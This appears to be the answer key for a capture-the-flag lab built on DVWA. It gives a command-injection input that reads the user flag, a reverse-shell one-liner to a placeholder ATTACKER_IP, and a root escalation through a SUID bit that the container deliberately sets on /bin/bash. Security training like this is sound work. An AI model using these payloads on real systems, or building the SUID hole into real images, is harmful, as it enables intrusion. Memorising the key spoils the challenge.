# DVWA-with-flags — Solution notes

> ⚠️ Spoilers. This file documents the intended path to both flags. Keep it out
> of any copy handed to players.

Two HackTheBox-style flags are planted in the container and **regenerated on
every container start** (each is `flag{<random md5>}`):

| Flag | Location | Permissions | How it's meant to be read |
|------|----------|-------------|---------------------------|
| user | `/var/www/user.txt` | `www-data:www-data` `0644` | shell as `www-data` via DVWA RCE |
| root | `/root/root.txt`    | `root:root` `0400`         | after privesc to `root`          |

Because they are random per run, grade by format (`flag{<32 hex>}`) and/or
compare against the live values:

```sh
./manage.sh flags
```

---

## 0. Start the box

```sh
./manage.sh up          # build + start on http://127.0.0.1:8383
```

The DVWA account passwords are **randomized per run** (the stock `password` /
`abc123` / ... are no longer valid), so grab the admin password first:

```sh
./manage.sh creds          # prints user:password for this run
```

On first visit DVWA sends you to the setup page — click **Create / Reset
Database** (this seeds the users table with the randomized MD5 hashes), then log
in as `admin` with the password from `creds` and set the security level to
**Low** (DVWA Security page).

---

## 1. User flag — foothold as `www-data`

DVWA's **Command Injection** module runs shell commands as the Apache user
(`www-data`). On the *Command Injection* page the input is an IP to ping; chain
an extra command onto it.

In the "Enter an IP address" box (Low security):

```
127.0.0.1; cat /var/www/user.txt
```

The response includes the user flag:

```
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

> Note the flag lives in `/var/www`, one level **above** the web root
> (`/var/www/html`), so it cannot simply be requested over HTTP — command
> execution is required.

For a fuller foothold, spawn a reverse shell from the same injection point, e.g.:

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

(Listener: `nc -lvnp 4444`.) Any RCE primitive in DVWA works — command
injection is the simplest.

---

## 2. Root flag — privilege escalation via SUID bash

As `www-data`, the root flag is unreadable:

```sh
$ cat /root/root.txt
cat: /root/root.txt: Permission denied
```

Enumerate SUID binaries — the standard first check:

```sh
find / -perm -4000 -type f 2>/dev/null
```

`/bin/bash` shows up with the SUID bit set. Abuse it
([GTFOBins: bash](https://gtfobins.github.io/gtfobins/bash/#suid)) — the `-p`
flag preserves the elevated effective UID instead of dropping it:

```sh
/bin/bash -p
id            # euid=0(root)
cat /root/root.txt
```

```
flag{yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy}
```

End-to-end, straight from the command-injection box:

```
127.0.0.1; /bin/bash -pc 'cat /root/root.txt'
```

---

## Resetting / cleaning

```sh
./manage.sh reset         # recreate container -> brand new flags (DB kept)
./manage.sh reset --hard  # new flags + wipe the database volume
./manage.sh clean         # remove containers, image, and volumes
```

## Where the mechanics live

- `docker-entrypoint.sh` — generates both flags and sets the SUID bit on
  `/bin/bash` on every start, then hands off to the stock PHP/Apache entrypoint.
- `Dockerfile` — installs the entrypoint (`ENTRYPOINT`/`CMD`).
- `compose.yml` — `pull_policy: build` so the local image (with the entrypoint)
  is used instead of the upstream prebuilt one.
- `manage.sh` — up / reset / clean / flags helper.
